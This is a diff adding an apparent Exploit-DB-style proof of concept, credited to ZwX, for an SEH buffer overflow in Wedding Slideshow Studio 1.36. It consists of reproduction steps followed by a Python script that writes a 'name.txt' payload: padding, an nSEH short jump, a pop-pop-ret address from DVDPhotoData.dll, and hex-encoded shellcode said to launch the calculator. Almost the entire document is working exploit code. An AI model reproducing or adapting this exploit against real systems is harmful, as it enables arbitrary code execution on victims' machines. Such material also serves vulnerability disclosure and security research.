@@ -1,0 +1,54 @@
+#Exploit Title: Wedding Slideshow Studio 1.36 - 'Name' Buffer Overflow
+#Exploit Author : ZwX
+#Exploit Date: 2020-02-10
+#Vendor Homepage : http://www.wedding-slideshow-studio.com/
+#Tested on OS: Windows 10 v1803
+#Social: twitter.com/ZwX2a
+
+
+## Steps to Reproduce: ##
+#1. Run the python exploit script, it will create a new file with the name "name.txt".
+#2. Just copy the text inside "name.txt".
+#3. Start the program. In the new window click "Help" > "Register ...
+#4. Now paste the content of "name.txt" into the field: "Registration Name" > Click "Ok"
+#5. The calculator runs successfully
+
+
+#!/usr/bin/python 
+
+from struct import pack
+
+buffer = "\x41" * 256
+nseh = "\xeb\x06\xff\xff"
+seh = pack("<I",0x100411fc)
+#0x100411fc : pop edi # pop esi # ret 0x04 |  {PAGE_EXECUTE_READ} [DVDPhotoData.dll]
+#ASLR: False, Rebase: False, SafeSEH: False, OS: False, v8.0.6.0 (C:\Program Files\Wedding Slideshow Studio\DVDPhotoData.dll)
+long_buffer = "\x44" * 600
+shellcode =  ""
+shellcode += "\xdb\xce\xbf\x90\x28\x2f\x09\xd9\x74\x24\xf4\x5d\x29"
+shellcode += "\xc9\xb1\x31\x31\x7d\x18\x83\xc5\x04\x03\x7d\x84\xca"
+shellcode += "\xda\xf5\x4c\x88\x25\x06\x8c\xed\xac\xe3\xbd\x2d\xca"
+shellcode += "\x60\xed\x9d\x98\x25\x01\x55\xcc\xdd\x92\x1b\xd9\xd2"
+shellcode += "\x13\x91\x3f\xdc\xa4\x8a\x7c\x7f\x26\xd1\x50\x5f\x17"
+shellcode += "\x1a\xa5\x9e\x50\x47\x44\xf2\x09\x03\xfb\xe3\x3e\x59"
+shellcode += "\xc0\x88\x0c\x4f\x40\x6c\xc4\x6e\x61\x23\x5f\x29\xa1"
+shellcode += "\xc5\x8c\x41\xe8\xdd\xd1\x6c\xa2\x56\x21\x1a\x35\xbf"
+shellcode += "\x78\xe3\x9a\xfe\xb5\x16\xe2\xc7\x71\xc9\x91\x31\x82"
+shellcode += "\x74\xa2\x85\xf9\xa2\x27\x1e\x59\x20\x9f\xfa\x58\xe5"
+shellcode += "\x46\x88\x56\x42\x0c\xd6\x7a\x55\xc1\x6c\x86\xde\xe4"
+shellcode += "\xa2\x0f\xa4\xc2\x66\x54\x7e\x6a\x3e\x30\xd1\x93\x20"
+shellcode += "\x9b\x8e\x31\x2a\x31\xda\x4b\x71\x5f\x1d\xd9\x0f\x2d"
+shellcode += "\x1d\xe1\x0f\x01\x76\xd0\x84\xce\x01\xed\x4e\xab\xee"
+shellcode += "\x0f\x5b\xc1\x86\x89\x0e\x68\xcb\x29\xe5\xae\xf2\xa9"
+shellcode += "\x0c\x4e\x01\xb1\x64\x4b\x4d\x75\x94\x21\xde\x10\x9a"
+shellcode += "\x96\xdf\x30\xf9\x79\x4c\xd8\xd0\x1c\xf4\x7b\x2d"
+
+payload = buffer + nseh + seh + shellcode + long_buffer
+try:
+    f=open("name.txt","w")
+    print "[+] Creating %s bytes evil payload.." %len(payload)
+    f.write(payload)
+    f.close()
+    print "[+] File created!"
+except:
+    print "File cannot be created"
